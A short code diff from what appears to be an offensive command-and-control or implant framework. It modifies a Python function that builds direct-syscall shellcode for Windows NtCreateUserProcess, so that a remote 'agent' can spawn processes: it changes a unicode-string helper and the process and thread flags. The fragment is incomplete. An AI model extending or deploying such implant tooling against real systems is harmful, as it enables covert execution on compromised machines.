@@ -9,7 +9,7 @@ PARAMS = [
 def NtCreateUserProcess(agent_id, p_params, image_path, h_pipe):
     from models.agent import Agent
     from models.syscall import Syscall
-    from services.binary import build_ptr, to_unicode, push_syscall, build_ps_create_info, build_ps_attribute_list
+    from services.binary import build_ptr, build_unicode_string, push_syscall, build_ps_create_info, build_ps_attribute_list
     import struct
     
     agent = Agent.by_id(agent_id)
@@ -22,8 +22,7 @@ def NtCreateUserProcess(agent_id, p_params, image_path, h_pipe):
     # 2. ThreadHandle (8)
     h_thread_data, image_str_ptr = build_ptr(h_thread_ptr, b"\x00" * 8)
     # 3. Unicode string for Attribute List (ImagePath)
-    image_path_unicode = to_unicode(image_path)
-    image_str_data, create_info_ptr = build_ptr(image_str_ptr, image_path_unicode)
+    image_str_data, create_info_ptr = build_unicode_string(image_str_ptr, image_path)
     # 4. PS_CREATE_INFO (88)
     create_info_data, handle_array_ptr = build_ps_create_info(create_info_ptr)
     # 5. Handle Array for Attribute List (8)
@@ -38,14 +37,14 @@ def NtCreateUserProcess(agent_id, p_params, image_path, h_pipe):
         0x2000000,        # P4: THREAD_ALL_ACCESS (R9)
         0x0,             # P5: [RSP+0x28] ObjectAttributes
         0x0,             # P6: [RSP+0x30] ObjectAttributes
-        0x204,            # P7: [RSP+0x38] ProcessFlags (Inherit Handles)
-        0x1,             # P8: [RSP+0x40] ThreadFlags
+        0x0,            # P7: [RSP+0x38] ProcessFlags (Inherit Handles)
+        0x0,             # P8: [RSP+0x40] ThreadFlags
         p_params,        # P9: [RSP+0x48] Pointer to RTL_USER_PROCESS_PARAMETERS
         create_info_ptr, # P10:[RSP+0x50] Pointer to PS_CREATE_INFO
         0    # P11:[RSP+0x58] Pointer to PS_ATTRIBUTE_LIST
     ]
 
-    shellcode = push_syscall(syscall, params, True)
+    shellcode = push_syscall(syscall, params)
     data = h_proc_data + h_thread_data + image_str_data + create_info_data + handle_array_data + attr_list_data
     
     print(
